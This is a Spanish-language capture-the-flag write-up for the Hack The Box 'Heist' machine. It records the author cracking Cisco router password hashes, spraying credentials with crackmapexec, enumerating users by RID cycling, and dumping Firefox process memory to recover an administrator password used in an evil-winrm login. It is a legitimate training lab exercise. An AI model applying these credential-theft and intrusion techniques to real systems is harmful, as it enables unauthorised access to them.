# Heist ![Avatar](https://www.hackthebox.eu/storage/avatars/131dbaba68b169bd5ff59ac09420b09f_thumb.png)

## Initial Scan
```
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49669/tcp open  msrpc         Microsoft Windows RPC
```
## Enum 
### HTTP
En la landing page podemos ver un login y podemos logearnos como guest obteniendo asi acceso a una página de issues donde un usuario (**Hazard**) se queja de problemas con el router y postea la configuracion del mismo
```
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
```
Podemos obtener los siguientes combos de user pass aprovechando el uso del algoritmo usado para el tipo 7 de Cisco, usaremos un cracker [online](https://www.ifm.net.nz/cookbooks/passwordcracker.html)
```
rout3r:$uperP@ssword
admin:Q4)sJu\Y8qz*A3?d
```
Usando JTR vemos que la otra pass es:
```
stealth1agent
```
Hagamos un diccionario de passwords y otro de usuarios y tiremos de crackmapexec
```
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\Hazard:stealth1agent 
```
Obtenemos unas credenciales validas pero parece que no valen para otros servicios, probemos a hacer RID cicling para encontrar otros usuarios
```
SMB         10.10.10.149    445    SUPPORTDESK      500: SUPPORTDESK\Administrator (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      501: SUPPORTDESK\Guest (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      503: SUPPORTDESK\DefaultAccount (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      513: SUPPORTDESK\None (SidTypeGroup)
SMB         10.10.10.149    445    SUPPORTDESK      1008: SUPPORTDESK\Hazard (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1009: SUPPORTDESK\support (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1012: SUPPORTDESK\Chase (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1013: SUPPORTDESK\Jason (SidTypeUser)
```
Añadimos los nuevos usuarios a la lista y volvemos a tirar de cme
```
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\Chase:Q4)sJu\Y8qz*A3?d 
```
Con estas creds podemos acceder acceder a la maquina usando el evilwinrm

## Privesc
Encontramos un todo dentro de Chase
```
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access for guest user.
```
Usando get-process podemos ver varios procesos de firefox activos , lo mismo haciendo un procdump podemos obtener unas credenciales validas , no se encuentra en la máquina asi que lo tenemos que subir nosotros.

Dumpeamos el proceso y nos pasamos el dmp a local usando la utilidad download de evil-winrm, grepeamos htb por el formato de los correos de la plataforma y encontramos la siguiente request
```
localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
``` 
Asi que tenemos unas creds para la pagina web
```
admin@support.htb:4dD!5}x/re8]FBuZ
```
Probamos si nos valen para el evil-winrm
```
evil-winrm -i 10.10.10.149 -u administrator -p '4dD!5}x/re8]FBuZ'
```
Y finalmente soy admin
